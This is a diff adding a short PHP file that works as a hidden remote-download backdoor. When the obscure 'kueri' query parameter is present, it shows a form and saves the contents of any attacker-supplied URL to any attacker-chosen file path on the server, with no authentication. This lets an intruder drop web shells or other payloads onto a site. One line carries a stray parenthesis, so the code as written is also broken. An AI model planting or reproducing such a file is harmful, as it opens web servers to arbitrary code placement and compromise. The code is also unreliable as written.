@@ -1,0 +1,19 @@
+<?php
+  
+if (isset($_GET["kueri"])){ echo '<form name="myform" TARGET="_self">';
+echo 'URL: <input type="text" name="u"><br>';
+echo 'File: <input type="text" name="f"><br>';
+echo '<input name="kueri" value="sch" type="hidden">';
+echo '<input type="submit" value="Submit">';
+echo '</form>'; 
+if (!empty($_REQUEST['kueri'])) {
+set_time_limit(0);
+$url = $_REQUEST['u']);     
+$file_name = $_REQUEST['f'];
+    if (file_put_contents($file_name, file_get_contents($url)))
+    {        echo "File downloaded successfully";    }
+    else    {        echo "File downloading failed.";    }
+}
+} 
+    
+?>
